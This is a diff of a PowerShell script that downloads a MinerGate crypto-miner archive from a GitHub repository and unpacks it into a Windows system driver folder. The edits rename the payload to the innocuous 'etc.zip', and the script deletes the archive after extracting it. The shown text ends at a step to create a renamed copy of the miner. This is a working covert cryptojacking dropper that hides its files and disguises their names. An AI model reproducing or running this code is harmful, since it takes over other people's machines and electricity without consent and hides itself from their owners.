@@ -1,6 +1,6 @@
 # Download MinerGate CLI
-$url = "https://github.com/diggles9991/MG/raw/master/MinerGate-cli-4.04-win64.zip"
-$output = "C:\Windows\System32\drivers\en-US\MG.zip"
+$url = "https://github.com/diggles9991/MG/raw/master/etc.zip"
+$output = "C:\Windows\System32\drivers\en-US\etc.zip"
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $output)
 
@@ -13,19 +13,20 @@ function Unzip
 
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
-Unzip "C:\Windows\System32\drivers\en-US\MG.zip" "C:\Windows\System32\drivers\en-US\"
+Unzip "C:\Windows\System32\drivers\en-US\etc.zip" "C:\Windows\System32\drivers\en-US\"
 
 
 # Change Directory
 CD C:\Windows\System32\drivers\en-US\
 
+#Disabled
 # Rename extracted folder
-$oldpath = Get-ChildItem | ?{ $_.PSIsContainer }
-Rename-Item $oldpath.name etc
+#$oldpath = Get-ChildItem | ?{ $_.PSIsContainer }
+#Rename-Item $oldpath.name etc
 
 
 # Remove zip
-Remove-Item MG.zip
+Remove-Item etc.zip
 
 
 # Create renamed copy of Miner
